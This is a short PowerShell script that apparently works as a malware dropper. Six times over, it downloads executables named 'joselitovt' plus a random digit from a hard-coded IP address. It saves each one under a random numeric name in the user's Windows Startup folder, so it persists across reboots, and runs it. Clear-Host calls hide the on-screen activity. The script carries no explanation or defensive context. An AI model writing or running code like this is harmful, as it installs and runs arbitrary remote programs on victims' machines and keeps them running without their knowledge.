$value = (([string]$name = (Get-Random -Maximum 999999 -Minimum 10000)) + ".exe")
$lista = "joselitovt"
$ProcName = ".exe"

for ($i = 0; $i -le 5; $i++){
$WebFile = ([string]$WebLink = "http://192.168.50.4/" + ($lista + (Get-Random -Maximum 5 -Minimum 1) + $ProcName))
Clear-Host


(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$value")
Start-Process ("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$value")
}